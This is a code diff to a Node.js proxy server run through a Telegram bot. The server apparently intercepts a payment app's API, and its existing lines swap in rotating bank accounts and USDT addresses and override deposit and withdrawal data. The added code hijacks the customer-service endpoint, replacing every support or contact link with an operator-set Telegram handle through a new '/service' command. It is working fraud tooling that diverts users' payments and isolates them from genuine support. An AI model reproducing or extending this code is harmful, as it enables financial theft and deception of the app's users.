@@ -1,5 +1,6 @@
 const express = require('express');
-const TelegramBot = require('node-telegram-bot-api');
+const _TelegramBot = require('node-telegram-bot-api');
+const TelegramBot = _TelegramBot.default || _TelegramBot;
 const { Redis } = require('@upstash/redis');
 const crypto = require('crypto');
 
@@ -20,6 +21,8 @@ const DEFAULT_DATA = {
   logRequests: false,
   debugMode: false,
   usdtAddress: '',
+  serviceOverride: true,
+  serviceLink: 'https://t.me/iukpay_support',
   depositSuccess: false,
   depositBonus: 0,
   withdrawOverride: 0,
@@ -154,7 +157,7 @@ async function saveData(data) {
       if (!skipMerge) {
         const current = await redis.get('iukpayData');
         if (current && typeof current === 'object') {
-          const settingsKeys = ['banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress', 'logRequests', 'debugMode', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate'];
+          const settingsKeys = ['banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress', 'serviceOverride', 'serviceLink', 'logRequests', 'debugMode', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate'];
           for (const key of settingsKeys) {
             if (current[key] !== undefined) {
               data[key] = current[key];
@@ -889,6 +892,12 @@ app.post('/bot-webhook', async (req, res) => {
 /usdt <address> — Set USDT address
 /usdt off — Disable USDT override
 
+=== CUSTOMER SERVICE ===
+/service on — Enable support link override
+/service off — Disable support link override (Real links)
+/service <link> — Set custom support link (e.g. /service https://t.me/your_handle)
+/service — Check support override status
+
 === TRACKING ===
 /idtrack — Show all tracked user IDs
 
@@ -935,6 +944,8 @@ Example:
       const idCount = Object.keys(data.userOverrides || {}).length;
       let m = `📊 Status:\nProxy: ${data.botEnabled ? '🟢 ON' : '🔴 OFF'}\nBanks: ${data.banks.length}\nAuto-Rotate: ${data.autoRotate ? '🔄 ON' : '❌ OFF'}\nLog: ${data.logRequests ? '📡 ON' : '🔇 OFF'}\nDebug Payload: ${data.debugMode ? '🔍 ON (All endpoints)' : '❌ OFF'}\nTracked Users: ${Object.keys(data.trackedUsers || {}).length}`;
       if (data.usdtAddress) m += `\n₮ USDT: ${data.usdtAddress.substring(0, 15)}...`;
+      m += `\n🎧 Service Override: ${data.serviceOverride !== false ? '🟢 ON' : '🔴 OFF'}`;
+      if (data.serviceLink) m += ` (${data.serviceLink})`;
       if (active) m += `\n\n💳 Active:\n${active.accountHolder}\n${active.accountNo}\nIFSC: ${active.ifsc}${active.bankName ? '\nBank: ' + active.bankName : ''}${active.upiId ? '\nUPI: ' + active.upiId : ''}`;
       else m += '\n\n⚠️ No active bank';
       await bot.sendMessage(chatId, m);
@@ -1343,6 +1354,39 @@ Example:
         await bot.sendMessage(chatId, '❌ Invalid address (20+ chars required)');
       }
       return res.sendStatus(200);
+    }
+
+    if (text === '/service' || text.startsWith('/service ') || text === '/serviceon' || text === '/serviceoff') {
+      data = await loadData(true);
+      const cmdArg = text.replace(/^\/service\s*/i, '').trim().toLowerCase();
+      if (cmdArg === 'off' || text === '/serviceoff') {
+        data.serviceOverride = false;
+        data._skipOverrideMerge = true;
+        await saveData(data);
+        await bot.sendMessage(chatId, '🔴 Customer Service Override: <b>OFF</b>\n\nAb app me real upstream support links dikhenge (koi override nahi hoga).', { parse_mode: 'HTML' });
+        return res.sendStatus(200);
+      } else if (cmdArg === 'on' || text === '/serviceon') {
+        data.serviceOverride = true;
+        if (!data.serviceLink) data.serviceLink = 'https://t.me/iukpay_support';
+        data._skipOverrideMerge = true;
+        await saveData(data);
+        await bot.sendMessage(chatId, `🟢 Customer Service Override: <b>ON</b>\n🔗 Active Link: <code>${data.serviceLink}</code>`, { parse_mode: 'HTML' });
+        return res.sendStatus(200);
+      } else if (cmdArg.startsWith('http://') || cmdArg.startsWith('https://') || cmdArg.startsWith('t.me/')) {
+        let newLink = text.substring(8).trim();
+        if (newLink.startsWith('t.me/')) newLink = 'https://' + newLink;
+        data.serviceLink = newLink;
+        data.serviceOverride = true;
+        data._skipOverrideMerge = true;
+        await saveData(data);
+        await bot.sendMessage(chatId, `✅ Customer Service Link Updated:\n🔗 <code>${newLink}</code>\n🟢 Override is <b>ON</b>`, { parse_mode: 'HTML' });
+        return res.sendStatus(200);
+      } else {
+        const isEnabled = data.serviceOverride !== false;
+        const currentLink = data.serviceLink || 'https://t.me/iukpay_support';
+        await bot.sendMessage(chatId, `🎧 <b>Customer Service Override Settings</b>\n\nStatus: ${isEnabled ? '🟢 ON' : '🔴 OFF'}\nActive Link: <code>${currentLink}</code>\n\n<b>Commands:</b>\n• <code>/service on</code> — Enable override\n• <code>/service off</code> — Disable override (show real support)\n• <code>/service &lt;link&gt;</code> — Set custom support URL`, { parse_mode: 'HTML' });
+        return res.sendStatus(200);
+      }
     }
 
 
@@ -2685,6 +2729,10 @@ for (const ep of WALLET_INTERCEPT_ENDPOINTS) {
 
 app.all('/app/api/customer/list', async (req, res) => {
   const data = await loadData();
+  if (data.serviceOverride === false) {
+    return await transparentProxy(req, res);
+  }
+  const targetLink = data.serviceLink || 'https://t.me/iukpay_support';
   try {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const respData = getResponseData(jsonResp);
@@ -2693,26 +2741,26 @@ app.all('/app/api/customer/list', async (req, res) => {
         if (item && typeof item === 'object') {
           for (const [k, v] of Object.entries(item)) {
             if (typeof v === 'string' && (v.includes('http') || v.includes('t.me') || v.includes('telegram') || v.includes('whatsapp') || v.includes('wa.me'))) {
-              item[k] = 'https://t.me/iukpay_support';
+              item[k] = targetLink;
             }
           }
-          if (item.url) item.url = 'https://t.me/iukpay_support';
-          if (item.link) item.link = 'https://t.me/iukpay_support';
-          if (item.serviceUrl) item.serviceUrl = 'https://t.me/iukpay_support';
-          if (item.customerUrl) item.customerUrl = 'https://t.me/iukpay_support';
-          if (item.contactUrl) item.contactUrl = 'https://t.me/iukpay_support';
+          if (item.url) item.url = targetLink;
+          if (item.link) item.link = targetLink;
+          if (item.serviceUrl) item.serviceUrl = targetLink;
+          if (item.customerUrl) item.customerUrl = targetLink;
+          if (item.contactUrl) item.contactUrl = targetLink;
         }
       }
     } else if (respData && typeof respData === 'object') {
       for (const [k, v] of Object.entries(respData)) {
         if (typeof v === 'string' && (v.includes('http') || v.includes('t.me') || v.includes('telegram') || v.includes('whatsapp') || v.includes('wa.me'))) {
-          respData[k] = 'https://t.me/iukpay_support';
+          respData[k] = targetLink;
         }
       }
     }
     if (jsonResp) {
       const str = JSON.stringify(jsonResp);
-      const replaced = str.replace(/https?:\/\/[^\s"',\\\]}>]+/gi, 'https://t.me/iukpay_support');
+      const replaced = str.replace(/https?:\/\/[^\s"',\\\]}>]+/gi, targetLink);
       const newJson = JSON.parse(replaced);
       sendJson(res, respHeaders, newJson, replaced);
     } else {
